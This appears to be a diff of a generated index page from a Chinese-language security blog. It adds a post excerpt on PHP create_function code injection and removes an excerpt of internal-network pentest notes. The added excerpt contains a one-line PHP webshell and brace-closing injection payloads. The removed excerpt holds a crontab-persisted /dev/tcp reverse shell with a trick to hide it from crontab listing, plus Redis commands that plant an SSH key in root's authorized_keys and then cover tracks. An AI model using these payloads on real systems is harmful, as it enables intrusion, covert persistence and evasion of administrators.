@@ -117,6 +117,86 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2019/01/10/create_function.html" >create_function</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-01-10  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>p神在小密圈提了一个create_function的tips,就照之前的来说一句话:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php $sl &#x3D; create_function(&#39;&#39;, @$_REQUEST[&#39;pass&#39;]);$sl();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>只需要单独一个create_function就可以执行函数,搜了下发现在很早的时候80sec提过这个问题:<a target="_blank" rel="noopener" href="https://www.securityfocus.com/archive/1/496728">https://www.securityfocus.com/archive/1/496728</a></p>
+<p>不过说的主要是第二个参数可控的情况下。原理来说很简单,create_function是类似这样的一个函数:</p>
+<pre class="line-numbers language-none"><code class="language-none">function create_function($args, $code) &#123;
+  eval(&quot;
+    function lambda_1 ($args) &#123; $code &#125;
+  &quot;);
+  return &#39;lambda_1&#39;;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>所以在第二个参数可控的情况下闭合大括号<code>return 0; &#125; echo &#39;outside&#39;; //</code>，就可以执行:</p>
+<pre class="line-numbers language-none"><code class="language-none">eval(&quot;
+  function lambda_1 () &#123; return 0; &#125; echo &#39;outside&#39;; &#x2F;&#x2F; &#125;
+&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>第一个可控的情况下,这样就可以执行phpinfo:</p>
+<pre class="line-numbers language-none"><code class="language-none">create_function(&#39;)&#123;&#125;phpinfo();&#x2F;&#x2F;&#39;, &#39;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>可以放gdb里面直接调试下,在php源代码里面搜索create_function的实现，然后打断点就可以调试出来:</p>
+	
+
+	</div>
+  <a type="button" href="/2019/01/10/create_function.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>p神在小密圈提了一个create_function的tips,就照之前的来说一句话:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php $sl &#x3D; create_function(&#39;&#39;, @$_REQUEST[&#39;pass&#39;]);$sl();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>只需要单独一个create_function就可以执行函数,搜了下发现在很早的时候80sec提过这个问题:<a target="_blank" rel="noopener" href="https://www.securityfocus.com/archive/1/496728">https://www.securityfocus.com/archive/1/496728</a></p>
+<p>不过说的主要是第二个参数可控的情况下。原理来说很简单,create_function是类似这样的一个函数:</p>
+<pre class="line-numbers language-none"><code class="language-none">function create_function($args, $code) &#123;
+  eval(&quot;
+    function lambda_1 ($args) &#123; $code &#125;
+  &quot;);
+  return &#39;lambda_1&#39;;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>所以在第二个参数可控的情况下闭合大括号<code>return 0; &#125; echo &#39;outside&#39;; //</code>，就可以执行:</p>
+<pre class="line-numbers language-none"><code class="language-none">eval(&quot;
+  function lambda_1 () &#123; return 0; &#125; echo &#39;outside&#39;; &#x2F;&#x2F; &#125;
+&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>第一个可控的情况下,这样就可以执行phpinfo:</p>
+<pre class="line-numbers language-none"><code class="language-none">create_function(&#39;)&#123;&#125;phpinfo();&#x2F;&#x2F;&#39;, &#39;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>可以放gdb里面直接调试下,在php源代码里面搜索create_function的实现，然后打断点就可以调试出来:</p>
+	
+	</div>
+  <a type="button" href="/2019/01/10/create_function.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2018/12/18/pcntl_exec.html" >pcntl_exec</a>
 		</h3>
 		</div>
@@ -595,74 +675,6 @@ for i in gzip.GzipFile(fileobj&#x3D;res):
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2018/06/05/local-network-pentest.html" >内网渗透注意事项</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2018-06-05  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="内网定时反弹"><a href="#内网定时反弹" class="headerlink" title="内网定时反弹:"></a>内网定时反弹:</h3><pre class="line-numbers language-none"><code class="language-none">(crontab -l;printf &quot;* * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;xx;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>上面反弹之后，在centos下面，如果没有监听shell的情况下，终端一直会有<code>you have an email in /var/spool/root</code>, 解决方法如下:</p>
-<pre class="line-numbers language-none"><code class="language-none">echo &quot;unset MAILCHECK&quot; &gt;&gt; ~&#x2F;.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="Redis写私钥"><a href="#Redis写私钥" class="headerlink" title="Redis写私钥"></a>Redis写私钥</h3><p>常规操作:</p>
-<pre class="line-numbers language-none"><code class="language-none">config get dir  &#x2F;&#x2F;获取当前的目录, 默认: &#x2F;usr&#x2F;local&#x2F;redis
-config get dbfilename &#x2F;&#x2F; 获取当前名字 默认: dump.rdb
-config set dir &#x2F;root&#x2F;.ssh
-config set dbfilename &quot;authorized_keys&quot;
-set xx &quot;\n\n pub_key\n\n&quot;
-save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>之后拿到shell，然后再把dir和dbfilename改回来，顺便把known_hosts给删除掉。</p>
-<p>redis查看部分key: </p>
-<pre class="line-numbers language-none"><code class="language-none">scan 1000 MATCH * COUNT 1000
-get [key]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2018/06/05/local-network-pentest.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="内网定时反弹"><a href="#内网定时反弹" class="headerlink" title="内网定时反弹:"></a>内网定时反弹:</h3><pre class="line-numbers language-none"><code class="language-none">(crontab -l;printf &quot;* * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;xx;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>上面反弹之后，在centos下面，如果没有监听shell的情况下，终端一直会有<code>you have an email in /var/spool/root</code>, 解决方法如下:</p>
-<pre class="line-numbers language-none"><code class="language-none">echo &quot;unset MAILCHECK&quot; &gt;&gt; ~&#x2F;.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="Redis写私钥"><a href="#Redis写私钥" class="headerlink" title="Redis写私钥"></a>Redis写私钥</h3><p>常规操作:</p>
-<pre class="line-numbers language-none"><code class="language-none">config get dir  &#x2F;&#x2F;获取当前的目录, 默认: &#x2F;usr&#x2F;local&#x2F;redis
-config get dbfilename &#x2F;&#x2F; 获取当前名字 默认: dump.rdb
-config set dir &#x2F;root&#x2F;.ssh
-config set dbfilename &quot;authorized_keys&quot;
-set xx &quot;\n\n pub_key\n\n&quot;
-save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>之后拿到shell，然后再把dir和dbfilename改回来，顺便把known_hosts给删除掉。</p>
-<p>redis查看部分key: </p>
-<pre class="line-numbers language-none"><code class="language-none">scan 1000 MATCH * COUNT 1000
-get [key]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2018/06/05/local-network-pentest.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -718,7 +730,7 @@ get [key]<span aria-hidden="true" class="line-numbers-rows"><span></span><span><
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>43</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>44</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -739,6 +751,10 @@ get [key]<span aria-hidden="true" class="line-numbers-rows"><span></span><span><
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/03/21/jndi-exec-by-mvel.html" ><i class="fa fa-file-o"></i>JNDI Bypass - MVEL</a>
+      </li>
+    
+      <li>
         <a href="/2022/03/18/from-spring-boot-to-getshell.html" ><i class="fa fa-file-o"></i>从Spring Boot H2 Database到Ge...</a>
       </li>
     
@@ -752,10 +768,6 @@ get [key]<span aria-hidden="true" class="line-numbers-rows"><span></span><span><
     
       <li>
         <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
-      </li>
-    
-      <li>
-        <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuator漏洞复现</a>
       </li>
     
   </ul>
